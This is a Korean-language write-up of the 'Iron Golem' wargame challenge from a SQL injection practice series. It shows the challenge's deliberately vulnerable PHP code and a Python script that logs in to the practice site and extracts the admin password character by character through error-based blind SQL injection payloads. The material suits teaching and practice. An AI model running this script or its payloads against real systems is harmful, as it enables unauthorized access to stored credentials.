---
layout: default
title: Iron Golem
parent: Load Of SQL Injection
nav_order: 21
---

# Iron Golem

일반적인 Blind SQL Injection은 불가능 하게 result를 보여주지 않도록 프로그래밍 되어있다.

하지만 error를 보여주는 코드를 통해 Error Based Blind SQL Injection을 실행할 수 있다.

문자를 하나하나 대입해가며, 맞을 경우 Error가 나오도록 유도하는 방법으로 Blind SQL Injection을 실행하면 pw를 알아낼 수 있다.

```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

python으로 툴을 짜 해결할 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw='or 1=1 and if(length(pw)=%d, 1,(select 1 union select 2))%%23%%20"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("highlight_file",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=hex(subkey);
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url="https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw='or 1=1 and if(substr(pw,%d,1)=%s, 1,(select 1 union select 2))%%23%%20" %(lenck,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("highlight_file",rresp)
        if find:
            print 'find'
            key=key+chr(subkey)
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```